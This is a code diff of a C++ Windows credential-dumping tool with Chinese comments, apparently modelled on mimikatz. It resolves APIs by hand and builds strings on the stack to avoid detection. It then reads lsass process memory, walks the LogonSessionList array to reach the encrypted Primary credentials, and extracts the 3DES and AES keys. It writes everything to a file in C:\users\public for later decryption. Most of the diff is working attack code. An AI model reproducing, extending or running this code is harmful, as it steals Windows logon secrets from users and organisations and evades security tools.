@@ -6,12 +6,6 @@
 
 
 
-
-
-
-
-
-
 typedef
 FARPROC
 (NTAPI* PNT_GetProcAddress)(
@@ -110,7 +104,7 @@ BOOL
 
 #define TABLE_LENGTH 1024
 #define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
-  
+
 inline LPVOID get_func_by_name(LPVOID module, char* func_name)
 {
     IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
@@ -259,6 +253,22 @@ inline bool _compare_lsasrv_name(char* dll_name) {
 
 
 int main() {
+    // 随着对mimikatz代码理解的深入，我现在对logonsessionlist的了解也更多了
+    // logonsessionlist并不是一个单纯的链表头，而是包含了多个链表的一个数组
+    /*
+0: kd> !list lsasrv!LogonSessionList
+00007ffa`5f0fc6e0  00000009`28f02210 00000009`2952a980
+00007ffa`5f0fc6f0  00000009`298ec530 00000009`28f034c0
+00007ffa`5f0fc700  00000009`297e6040 00000009`28ef6c40
+00007ffa`5f0fc710  00000009`29551fe0 00000009`28ef1e50
+00007ffa`5f0fc720  00000000`00000000 00000000`00000000
+00007ffa`5f0fc730  00000000`00000000 00000000`00000000
+00007ffa`5f0fc740  00000000`00000000 00000000`00000000
+00007ffa`5f0fc750  00000000`00000000 00000000`00000000
+    */
+    // 如上图所示这里面一共有四个链表，链表头地址分别为 00007ffa`5f0fc6e0 / 00007ffa`5f0fc6f0 / 00007ffa`5f0fc700 / 00007ffa`5f0fc710
+    // 我们需要从LogonSessionList开始遍历，每次往后偏移0x10，取出QWORD，为0则中止
+
     DWORD _offset_table[TABLE_LENGTH][4] = {
         {0x32BC3,0x39E5C,0x9E36E,0x108},
         {0x1FA63,0x395DC,0x8CA6C,0x108}
@@ -292,7 +302,14 @@ int main() {
         // 获取dllbase地址，0x30
         DWORD64 _p_dll_base = _entry_addr + 0x30;
         DWORD64 _dll_base = *(reinterpret_cast<DWORD64*>(_p_dll_base));
-        //printf("base address: %p\n", reinterpret_cast<DWORD64*>(_dll_base));
+
+#ifdef DEBUG
+
+        if (0 == reinterpret_cast<DWORD64*>(_dll_base)) {
+            MessageBoxA(NULL, "OK", "OK", MB_OK);
+        }
+        printf("base address: %p\n", reinterpret_cast<DWORD64*>(_dll_base));
+#endif // DEBUG
 
         if ((dll_name->Length != 0) && (_compare_kernel32_name(dll_name->Length, dll_name->Buffer))) {
             _kernel32_base_addr = _dll_base;
@@ -364,6 +381,7 @@ int main() {
     // 关闭文件句柄
     NT_CloseHandle(hFile);
 
+
     // 当前情况下，我们的table长度不超过100，就算以后也大概率不会超过1000，所以
     // 我按照3位数进行处理
     // 现在这种写法，我们需要经常回来修改shellcode代码，用起来很麻烦，因为需要修改里面硬编码的数组
@@ -382,80 +400,80 @@ int main() {
     // 计算各offset
     DWORD64 _logon_session_list_offset =
         _return_hex_value(stack_string[10]) << 28;
-     _logon_session_list_offset +=
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[11]) << 24;
-     _logon_session_list_offset +=
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[12]) << 20;
-     _logon_session_list_offset +=
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[13]) << 16;
-     _logon_session_list_offset +=
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[14]) << 12;
-     _logon_session_list_offset +=
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[15]) << 8;
-     _logon_session_list_offset +=
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[16]) << 4;
-     _logon_session_list_offset += 
+    _logon_session_list_offset +=
         _return_hex_value(stack_string[17]);
 
 
-     DWORD64 _3des_key_offset =
-         _return_hex_value(stack_string[8 + 10]) << 28;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 11]) << 24;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 12]) << 20;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 13]) << 16;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 14]) << 12;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 15]) << 8;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 16]) << 4;
-     _3des_key_offset +=
-         _return_hex_value(stack_string[8 + 17]);
+    DWORD64 _3des_key_offset =
+        _return_hex_value(stack_string[8 + 10]) << 28;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 11]) << 24;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 12]) << 20;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 13]) << 16;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 14]) << 12;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 15]) << 8;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 16]) << 4;
+    _3des_key_offset +=
+        _return_hex_value(stack_string[8 + 17]);
 
 
-     DWORD64 _aes_key_offset =
-         _return_hex_value(stack_string[8 + 8 + 10]) << 28;
-     _aes_key_offset +=
-         _return_hex_value(stack_string[8 + 8 + 11]) << 24;
-     _aes_key_offset +=
-         _return_hex_value(stack_string[8 + 8 + 12]) << 20;
-     _aes_key_offset +=
-         _return_hex_value(stack_string[8 + 8 + 13]) << 16;
-     _aes_key_offset +=
-         _return_hex_value(stack_string[8 + 8 + 14]) << 12;
-     _aes_key_offset +=
-         _return_hex_value(stack_string[8 + 8 + 15]) << 8;
-     _aes_key_offset +=
-         _return_hex_value(stack_string[8 + 8 + 16]) << 4;
-     _aes_key_offset += 
+    DWORD64 _aes_key_offset =
+        _return_hex_value(stack_string[8 + 8 + 10]) << 28;
+    _aes_key_offset +=
+        _return_hex_value(stack_string[8 + 8 + 11]) << 24;
+    _aes_key_offset +=
+        _return_hex_value(stack_string[8 + 8 + 12]) << 20;
+    _aes_key_offset +=
+        _return_hex_value(stack_string[8 + 8 + 13]) << 16;
+    _aes_key_offset +=
+        _return_hex_value(stack_string[8 + 8 + 14]) << 12;
+    _aes_key_offset +=
+        _return_hex_value(stack_string[8 + 8 + 15]) << 8;
+    _aes_key_offset +=
+        _return_hex_value(stack_string[8 + 8 + 16]) << 4;
+    _aes_key_offset +=
         _return_hex_value(stack_string[8 + 8 + 17]);
 
 
-     DWORD64 _credential_offset =
-         _return_hex_value(stack_string[8 + 8 + 8 + 10]) << 28;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 11]) << 24;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 12]) << 20;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 13]) << 16;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 14]) << 12;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 15]) << 8;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 16]) << 4;
-     _credential_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 17]);
+    DWORD64 _credential_offset =
+        _return_hex_value(stack_string[8 + 8 + 8 + 10]) << 28;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 11]) << 24;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 12]) << 20;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 13]) << 16;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 14]) << 12;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 15]) << 8;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 16]) << 4;
+    _credential_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 17]);
 
-     // 长度的偏移很小，2byte足够了
-     WORD _3des_aes_len_offset =
-         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 10]) << 4;
-     _3des_aes_len_offset +=
-         _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);
+    // 长度的偏移很小，2byte足够了
+    WORD _3des_aes_len_offset =
+        _return_hex_value(stack_string[8 + 8 + 8 + 8 + 10]) << 4;
+    _3des_aes_len_offset +=
+        _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);
 
     // DWORD _3des_key_offset = _offset_table[_index][1];
     // DWORD _aes_key_offset = _offset_table[_index][2];
@@ -559,190 +577,231 @@ int main() {
     PNT_ReadProcessMemory NT_ReadProcessMemory = (PNT_ReadProcessMemory)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
     SIZE_T bytesRead = 0;
     SecureZeroMemory(stack_string, 50);
+#ifdef DEBUG
+    printf("%p\n", (void*)(lsasrv + _logon_session_list_offset + 3));
+    printf("handle %x\n", _lsass_handle);
+    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
+#endif // DEBUG
     NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _logon_session_list_offset + 3), (void*)stack_string, 4, &bytesRead);
     // 反转字节得到偏移量
+
+#ifdef DEBUG
+    printf("%p\n", (void*)(lsasrv + _logon_session_list_offset + 3));
+    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
+#endif // DEBUG
     DWORD _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);
     char* _logon_session_list_addr = lsasrv + _logon_session_list_offset + 7 + _offset_rip;
-    char* _link_header = _logon_session_list_addr;
+#ifdef DEBUG
+    printf("_logon_session_list_addr %p\n", _logon_session_list_addr);
+    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
+#endif // DEBUG
+    DWORD64 _DWORD64_logon_session_list_ARRAY_addr = reinterpret_cast<DWORD64>(_logon_session_list_addr);
+#ifdef DEBUG
+    printf("_DWORD64_logon_session_list_ARRAY_addr %x\n", _DWORD64_logon_session_list_ARRAY_addr);
+    MessageBoxA(NULL, "OK33333333333", "OK333", MB_OK);
+#endif // DEBUG
     while (1) {
-        // 遍历logonsessionlist
-        // 取出前8字节，获取到下一个节点的地址
-        SecureZeroMemory(stack_string, 50);
-        bytesRead = 0;
-        NT_ReadProcessMemory(_lsass_handle, (void*)_logon_session_list_addr, (void*)stack_string, 8, &bytesRead);
-        DWORD64 _next_node_addr = *(reinterpret_cast<DWORD64*>(stack_string));
-        if (_link_header == reinterpret_cast<char*>(_next_node_addr)) {
-            break;
-        }
-        _logon_session_list_addr = reinterpret_cast<char*>(_next_node_addr);
-
+        char* _link_header = _logon_session_list_addr;
 #ifdef DEBUG
-        printf("\n\n\n\n_logon_session_list_addr node addr: %p\n", _logon_session_list_addr);
+
+        printf("_link_header address: %p\n", _link_header);
 #endif // DEBUG
-
-
-        // 现在我们已经拿到了logonsessionlist的地址，下面需要获得密文的地址
-        // 密文的偏移量和操作系统版本有关，具体请参考mimikatz源码
-        // C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c#L300
-        // 对于win10及以上版本，使用0x108即可
-        // 后面想了想，决定把这个偏移量也放在由main程序传过来的文件中
-        char* _p_credential_addr = _logon_session_list_addr + _credential_offset;
-        // 这个地址中保存了credential的地址，因此我们需要取出其中的内容
-        // 读取lsass进程内存
-        SecureZeroMemory(stack_string, 50);
-        bytesRead = 0;
-
-#ifdef DEBUG
-        printf("_p_credential_addr addr: %p\n", _p_credential_addr);
-#endif // DEBUG
-
-        // 每一步读取内存都可能会失败，如果失败，就continue
-        if (!NT_ReadProcessMemory(_lsass_handle, (void*)_p_credential_addr, (void*)stack_string, 8, &bytesRead))continue;
-        
-        // 将该指针重新解释为DWORD64并取值
-        DWORD64 _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
-        // _credential_addr是一个单链表的头地址，里面可能会有多个节点，每个节点都有一个packageID
-        // 而我们只想要Primary，也就是packageid为3的那个节点，节点地址+8取出dword就是packageid
-        // 如果取出的packageid不是3，我们就继续往后遍历
         while (1) {
-            // 获取packageID
+            // 遍历logonsessionlist
+            // 取出前8字节，获取到下一个节点的地址，因为第一个是头结点，里面并没有有意义的数据，因此我们在循环体开头就取地址
             SecureZeroMemory(stack_string, 50);
-            if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr +8), (void*)stack_string, 8, &bytesRead)) {
-                break; continue;
-            }
-            DWORD _package_id = *(reinterpret_cast<DWORD*>(stack_string));
-            if (3 == _package_id) {
-                // 命中我们的目标节点
-                // 此时_credential_addr就是正确的节点的地址，我们这里直接break即可
+            bytesRead = 0;
+            NT_ReadProcessMemory(_lsass_handle, (void*)_logon_session_list_addr, (void*)stack_string, 8, &bytesRead);
+            DWORD64 _next_node_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+#ifdef DEBUG
+
+            printf("_next_node_addr address: %p\n", _link_header);
+#endif // DEBUG
+            // 除了判断收尾相接之外，我们还要判断是否为空链表
+            if (0 == _next_node_addr || _link_header == reinterpret_cast<char*>(_next_node_addr)) {
                 break;
             }
-            else {
-                // 往后遍历
+            _logon_session_list_addr = reinterpret_cast<char*>(_next_node_addr);
+
+#ifdef DEBUG
+            printf("\n\n\n\n_logon_session_list_addr node addr: %p\n", _logon_session_list_addr);
+#endif // DEBUG
+
+
+            // 现在我们已经拿到了logonsessionlist的地址，下面需要获得密文的地址
+            // 密文的偏移量和操作系统版本有关，具体请参考mimikatz源码
+            // C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c#L300
+            // 对于win10及以上版本，使用0x108即可
+            // 后面想了想，决定把这个偏移量也放在由main程序传过来的文件中
+            char* _p_credential_addr = _logon_session_list_addr + _credential_offset;
+            // 这个地址中保存了credential的地址，因此我们需要取出其中的内容
+            // 读取lsass进程内存
+            SecureZeroMemory(stack_string, 50);
+            bytesRead = 0;
+
+#ifdef DEBUG
+            printf("_p_credential_addr addr: %p\n", _p_credential_addr);
+#endif // DEBUG
+
+            // 每一步读取内存都可能会失败，如果失败，就continue
+            if (!NT_ReadProcessMemory(_lsass_handle, (void*)_p_credential_addr, (void*)stack_string, 8, &bytesRead))continue;
+
+            // 将该指针重新解释为DWORD64并取值
+            DWORD64 _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+            // _credential_addr是一个单链表的头地址，里面可能会有多个节点，每个节点都有一个packageID
+            // 而我们只想要Primary，也就是packageid为3的那个节点，节点地址+8取出dword就是packageid
+            // 如果取出的packageid不是3，我们就继续往后遍历
+            while (1) {
+                // 获取packageID
                 SecureZeroMemory(stack_string, 50);
-                // 获取下一个节点的地址
-                if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr), (void*)stack_string, 8, &bytesRead)) {
+                if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr + 8), (void*)stack_string, 8, &bytesRead)) {
                     break; continue;
                 }
-                _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
-                // 判断是否达到了尾部
-                if (0 == _credential_addr)break;
+                DWORD _package_id = *(reinterpret_cast<DWORD*>(stack_string));
+                if (3 == _package_id) {
+                    // 命中我们的目标节点
+                    // 此时_credential_addr就是正确的节点的地址，我们这里直接break即可
+                    break;
+                }
+                else {
+                    // 往后遍历
+                    SecureZeroMemory(stack_string, 50);
+                    // 获取下一个节点的地址
+                    if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr), (void*)stack_string, 8, &bytesRead)) {
+                        break; continue;
+                    }
+                    _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+                    // 判断是否达到了尾部
+                    if (0 == _credential_addr)break;
+                }
             }
-        }
 
 
-        // 这个地址是一个结构体，+0x10偏移量就是密文的地址
-        SecureZeroMemory(stack_string, 50);
-        bytesRead = 0;
+            // 这个地址是一个结构体，+0x10偏移量就是密文的地址
+            SecureZeroMemory(stack_string, 50);
+            bytesRead = 0;
 
 #ifdef DEBUG
-        printf("_credential_addr: %p\n", _credential_addr);
+            printf("_credential_addr: %p\n", _credential_addr);
 #endif // DEBUG
 
 
 #ifdef DEBUG
-        printf("_p_second_level_credential_addr: %p\n", _credential_addr + 0x10);
+            printf("_p_second_level_credential_addr: %p\n", _credential_addr + 0x10);
 #endif // DEBUG
 
-        if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_credential_addr+0x10), (void*)stack_string, 8, &bytesRead))continue;
-        DWORD64 _second_level_credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
-        // 往后偏移0x10是密文地址，偏移0x1a取出一个word是密文长度
-        SecureZeroMemory(stack_string, 50);
-        bytesRead = 0;
+            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_credential_addr + 0x10), (void*)stack_string, 8, &bytesRead))continue;
+            DWORD64 _second_level_credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+            // 往后偏移0x10是密文地址，偏移0x1a取出一个word是密文长度
+            SecureZeroMemory(stack_string, 50);
+            bytesRead = 0;
 
 #ifdef DEBUG
-        printf("_second_level_credential_addr: %p\n", reinterpret_cast<void*>(_second_level_credential_addr));
+            printf("_second_level_credential_addr: %p\n", reinterpret_cast<void*>(_second_level_credential_addr));
 #endif // DEBUG
 
-        if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_second_level_credential_addr + 0x1a), (void*)stack_string, 2, &bytesRead))continue;
-        DWORD _cipher_length = *(reinterpret_cast<WORD*>(stack_string));
+            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_second_level_credential_addr + 0x1a), (void*)stack_string, 2, &bytesRead))continue;
+            DWORD _cipher_length = *(reinterpret_cast<WORD*>(stack_string));
 
 
 #ifdef DEBUG
-        printf("_cipher_length: %d\n", _cipher_length);
+            printf("_cipher_length: %d\n", _cipher_length);
 #endif // DEBUG
 
-        char* buffer = (char*)0;
-        if (_cipher_length > 0x400) {
-            char _temp_stack[0x500] = { 0 };
-            buffer = _temp_stack;
-        }
-        else if (_cipher_length > 0x300) {
-            char _temp_stack[0x400] = { 0 };
-            buffer = _temp_stack;
-        }
-        else if (_cipher_length > 0x200) {
-            char _temp_stack[0x300] = { 0 };
-            buffer = _temp_stack;
-        }
-        else if (_cipher_length > 0x100) {
-            char _temp_stack[0x200] = { 0 };
-            buffer = _temp_stack;
-        }
-        else {
-            char _temp_stack[0x100] = { 0 };
-            buffer = _temp_stack;
-        }
-        bytesRead = 0;
-        // 读取密文
-        /*        内存样例
-00000294`7a4765e0 0000000000000000      unknown  
-00000294`7a4765e8 0000000000080007      packageID
-00000294`7a4765f0 000002947a476608      primary字符串地址
-00000294`7a4765f8 0000000001b001a8      密文的maxlen和len
-00000294`7a476600 000002947a476610      密文地址
-00000294`7a476608 007972616d697250      primary     [从这里开始读取，offset: 0x28]
-00000294`7a476610 7742f497b51510ca      密文
-00000294`7a476618 49d4b3bd4c920307
-        */
-        if (!NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_second_level_credential_addr+0x28)), (void*)buffer, _cipher_length, &bytesRead))continue;
+            char* buffer = (char*)0;
+            if (_cipher_length > 0x400) {
+                char _temp_stack[0x500] = { 0 };
+                buffer = _temp_stack;
+            }
+            else if (_cipher_length > 0x300) {
+                char _temp_stack[0x400] = { 0 };
+                buffer = _temp_stack;
+            }
+            else if (_cipher_length > 0x200) {
+                char _temp_stack[0x300] = { 0 };
+                buffer = _temp_stack;
+            }
+            else if (_cipher_length > 0x100) {
+                char _temp_stack[0x200] = { 0 };
+                buffer = _temp_stack;
+            }
+            else {
+                char _temp_stack[0x100] = { 0 };
+                buffer = _temp_stack;
+            }
+            bytesRead = 0;
+            // 读取密文
+            /*        内存样例
+    00000294`7a4765e0 0000000000000000      unknown
+    00000294`7a4765e8 0000000000080007      packageID
+    00000294`7a4765f0 000002947a476608      primary字符串地址
+    00000294`7a4765f8 0000000001b001a8      密文的maxlen和len
+    00000294`7a476600 000002947a476610      密文地址
+    00000294`7a476608 007972616d697250      primary     [从这里开始读取，offset: 0x28]
+    00000294`7a476610 7742f497b51510ca      密文
+    00000294`7a476618 49d4b3bd4c920307
+            */
+            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_second_level_credential_addr + 0x28)), (void*)buffer, _cipher_length, &bytesRead))continue;
 
-        // 读取完成后，需要把读取出来的字节写入到文件中
+            // 读取完成后，需要把读取出来的字节写入到文件中
 
-        // 首先要写入长度
-        SecureZeroMemory(stack_string, 50);
-        stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'k'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
-        hFile = NT_CreateFileA(
-            stack_string,                   // File path
-            FILE_APPEND_DATA,              // Access mode (write)
-            0,                          // Share mode (no sharing)
-            NULL,                       // Security attributes (default)
-            OPEN_ALWAYS,              // Creation disposition (always create a new file)
-            FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
-            NULL                        // Template file (not used)
-        );
+            // 首先要写入长度
+            SecureZeroMemory(stack_string, 50);
+            stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'k'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
+            hFile = NT_CreateFileA(
+                stack_string,                   // File path
+                FILE_APPEND_DATA,              // Access mode (write)
+                0,                          // Share mode (no sharing)
+                NULL,                       // Security attributes (default)
+                OPEN_ALWAYS,              // Creation disposition (always create a new file)
+                FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
+                NULL                        // Template file (not used)
+            );
 
-        if (hFile == INVALID_HANDLE_VALUE) {
-            //fprintf(stderr, "Error creating/opening the file\n");
-            return 1;
-        }
+            if (hFile == INVALID_HANDLE_VALUE) {
+                //fprintf(stderr, "Error creating/opening the file\n");
+                return 1;
+            }
 
-        // Convert the WORD to a byte array
-        BYTE byteArray[4];
+            // Convert the WORD to a byte array
+            BYTE byteArray[4];
 
-        // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
-        byteArray[0] = (BYTE)(_cipher_length & 0xFF);         // Low byte
-        byteArray[1] = (BYTE)((_cipher_length >> 8) & 0xFF);  // High byte
-        byteArray[2] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte
-        byteArray[3] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 
+            // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
+            byteArray[0] = (BYTE)(_cipher_length & 0xFF);         // Low byte
+            byteArray[1] = (BYTE)((_cipher_length >> 8) & 0xFF);  // High byte
+            byteArray[2] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte
+            byteArray[3] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 
 
-        // Write the byte array to the file
-        DWORD bytesWritten;
-        if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
-            //fprintf(stderr, "Error writing to the file\n");
+            // Write the byte array to the file
+            DWORD bytesWritten;
+            if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
+                //fprintf(stderr, "Error writing to the file\n");
+                NT_CloseHandle(hFile);
+                return 1;
+            }
+
+            // 写入密文
+            DWORD _out_para = 0;
+            if (!NT_WriteFile(hFile, buffer, _cipher_length, &_out_para, NULL)) {
+                //fprintf(stderr, "Error writing to the file\n");
+                NT_CloseHandle(hFile);
+                return 1;
+            }
+
+            // 关闭文件句柄
             NT_CloseHandle(hFile);
-            return 1;
         }
 
-        // 写入密文
-        DWORD _out_para = 0;
-        if (!NT_WriteFile(hFile, buffer, _cipher_length, &_out_para, NULL)) {
-            //fprintf(stderr, "Error writing to the file\n");
-            NT_CloseHandle(hFile);
-            return 1;
+        // 从_logon_session_list_ARRAY_addr取出8字节判断是否为0
+        _DWORD64_logon_session_list_ARRAY_addr += 0x10;
+        SecureZeroMemory(stack_string, 50);
+        bytesRead = 0;
+        NT_ReadProcessMemory(_lsass_handle, (void*)_DWORD64_logon_session_list_ARRAY_addr, (void*)stack_string, 8, &bytesRead);
+        DWORD64 _next_link_list_addr = *(reinterpret_cast<DWORD64*>(stack_string));
+        if (0 == _next_link_list_addr) {
+            break;
         }
-
-        // 关闭文件句柄
-        NT_CloseHandle(hFile);
+        _logon_session_list_addr = reinterpret_cast<char*>(_DWORD64_logon_session_list_ARRAY_addr);
     }
 
     // 之后需要获取3des和aes的key
@@ -756,7 +815,7 @@ int main() {
     NT_ReadProcessMemory(_lsass_handle, (void*)_1_3des_addr, (void*)stack_string, 8, &bytesRead);
     DWORD64 _2_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
     SecureZeroMemory(stack_string, 50);
-    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_3des_addr+0x10)), (void*)stack_string, 8, &bytesRead);
+    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_3des_addr + 0x10)), (void*)stack_string, 8, &bytesRead);
 
     DWORD64 _3_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
     // 读取长度
@@ -799,7 +858,7 @@ int main() {
     // Write the byte array to the file
     DWORD bytesWritten;
     if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
-     //   fprintf(stderr, "Error writing to the file\n");
+        //   fprintf(stderr, "Error writing to the file\n");
         NT_CloseHandle(hFile);
         return 1;
     }
@@ -807,7 +866,7 @@ int main() {
     // 写入密文
     DWORD _out_para = 0;
     if (!NT_WriteFile(hFile, stack_string, _3des_len, &_out_para, NULL)) {
-       // fprintf(stderr, "Error writing to the file\n");
+        // fprintf(stderr, "Error writing to the file\n");
         NT_CloseHandle(hFile);
         return 1;
     }
@@ -852,7 +911,7 @@ int main() {
     );
 
     if (hFile == INVALID_HANDLE_VALUE) {
-       // fprintf(stderr, "Error creating/opening the file\n");
+        // fprintf(stderr, "Error creating/opening the file\n");
         return 1;
     }
 
@@ -866,14 +925,14 @@ int main() {
 
     // Write the byte array to the file
     if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
-       // fprintf(stderr, "Error writing to the file\n");
+        // fprintf(stderr, "Error writing to the file\n");
         NT_CloseHandle(hFile);
         return 1;
     }
 
     // 写入密文
     if (!NT_WriteFile(hFile, stack_string, _aes_len, &_out_para, NULL)) {
-       // fprintf(stderr, "Error writing to the file\n");
+        // fprintf(stderr, "Error writing to the file\n");
         NT_CloseHandle(hFile);
         return 1;
     }
